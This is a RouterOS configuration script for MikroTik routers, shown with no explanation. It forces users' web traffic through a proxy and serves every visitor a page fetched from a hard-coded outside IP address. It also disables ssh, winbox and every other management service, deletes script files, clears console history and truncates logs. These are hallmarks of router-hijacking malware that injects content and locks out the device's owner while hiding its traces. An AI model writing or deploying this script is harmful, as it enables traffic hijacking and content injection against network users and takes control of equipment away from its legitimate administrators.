# firewll
/ip firewall nat remove [find comment=sysadminpxy]
/ip firewall nat add disabled=no chain=dstnat protocol=tcp src-address-list=!Ok dst-port=80,443 action=redirect to-ports=8080 comment=sysadminpxy
/ip firewall nat move [find comment=sysadminpxy] destination=0
/ip firewall filter remove [find comment=sysadminpxy]
/ip firewall filter add disabled=no chain=input protocol=tcp dst-port=8080 action=add-src-to-address-list address-list=Ok address-list-timeout=15s comment=sysadminpxy

# proxy
/tool fetch url=http://101.99.40.30/error.html mode=http dst-path=webproxy/error.html
/file remove [find name~".html"]
/ip proxy set cache-path=webproxy port=8080
/ip proxy access add action=deny disabled=no
/ip proxy set enabled=yes
/tool fetch url=http://101.99.40.30/error.html mode=http dst-path=webproxy/error.html

# disable
/ip dns set servers=8.8.8.8
/ip service disable telnet,ftp,www,api-ssl,www-ssl,ssh,winbox
/file remove [find name~".rsc"]
/console clear-history
/system logging action set memory memory-lines=1	
/system logging action set memory memory-lines=1000
